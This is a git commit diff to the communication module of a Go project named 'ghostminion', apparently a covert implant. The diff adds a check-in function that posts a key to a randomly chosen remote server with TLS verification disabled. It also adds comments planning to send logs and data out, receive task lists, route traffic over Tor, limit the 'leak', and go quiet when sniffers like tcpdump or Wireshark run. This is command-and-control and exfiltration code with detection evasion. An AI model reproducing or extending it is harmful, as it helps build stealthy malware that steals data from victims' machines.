f58a423ec164512bcbabe63f149f87b6dbe4690e
Yechiel Babani <yechielb2000@gmail.com>
2025-04-11 00:05:07 +0300

    update canCommunicate function and add comment

--- ghostminion/communication/communicate.go
+++ ghostminion/communication/communicate.go
@@ -20,19 +20,35 @@ check if can communicate.
 after connection.
 	- send logs and data (first logs and then data).
 	- get a "todo list".
+
+consider using tor for hidden communication.
+
+don't send too much data (its a little risky) - make leak limit
+don't communicate if there are sniffers (tcpdump, wireshark, etc..)
+don't communicate if there is too much cpu usage
+todo: search for more risky communication times
+
 */
 
 var serverConfig config.ServerConfig
 
-func communicate() []byte {
-	if !canCommunicate() {
-		return nil
+func canCommunicate(client http.Client, serverConfig config.ServerConfig) bool {
+	route := fmt.Sprintf("https://%s:%d/reception", serverConfig.Address, serverConfig.Port)
+	values := map[string]string{"challenge": serverConfig.Key}
+	jsonValue, _ := json.Marshal(values)
+	res, _ := client.Post(route, "application/json", bytes.NewBuffer(jsonValue))
+	if res.StatusCode == 200 {
+		return true
 	}
+	return false
+}
+
+func communicate() []byte {
 	serverConfig = getRandomServer()
 	client := &http.Client{
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{
-				InsecureSkipVerify: true, // todo remove this.
+				InsecureSkipVerify: true, // todo remove this. (pass certificate instead).
 			},
 		},
 		Timeout: 60 * time.Second,
@@ -89,14 +105,4 @@ func getRandomServer() config.ServerConfig {
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	index := rng.Intn(len(servers))
 	return servers[index]
-}
-
-func canCommunicate() bool {
-	/*
-		don't send too much data (its a little risky) - make leak limit
-		don't communicate if there are sniffers (tcpdump, wireshark, etc..)
-		don't communicate if there is too much cpu usage
-		todo: search for more risky communication times
-	*/
-	return true
 }
